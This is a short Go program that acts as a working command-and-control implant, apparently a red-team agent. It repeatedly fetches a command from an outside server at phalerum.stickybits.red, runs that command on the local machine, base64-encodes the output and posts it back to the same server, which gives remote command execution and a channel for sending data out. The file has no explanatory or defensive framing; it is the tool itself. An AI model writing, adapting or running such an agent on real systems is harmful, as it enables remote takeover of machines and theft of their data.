package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os/exec"
	"strings"
)

type Post struct {
	Message string `json:"message"`
}

func main() {
	resp, err := http.Get("https://phalerum.stickybits.red/api/v1/agents/test")
	if err != nil {
		log.Fatalln(err)
	}

	resBody, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("Error: %s", err)
	}

	split := strings.Split(string(resBody), " ")

	cmd := exec.Command(split[0], split[1:]...)
	out, err := cmd.Output()
	if err != nil {
		fmt.Println(cmd)
		fmt.Println("Error running command: ", err)
	}

	// fmt.Println(out)

	sEnc := base64.StdEncoding.EncodeToString([]byte(string(out)))

	jsonBody := Post{
		Message: sEnc,
	}

	bodyBytes, err := json.Marshal(&jsonBody)
	if err != nil {
		log.Fatal(err)
	}

	reader := bytes.NewReader(bodyBytes)

	presp, err := http.Post("https://phalerum.stickybits.red/api/v1/agents/test", "application/json", reader)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Printf(presp.Status)
}
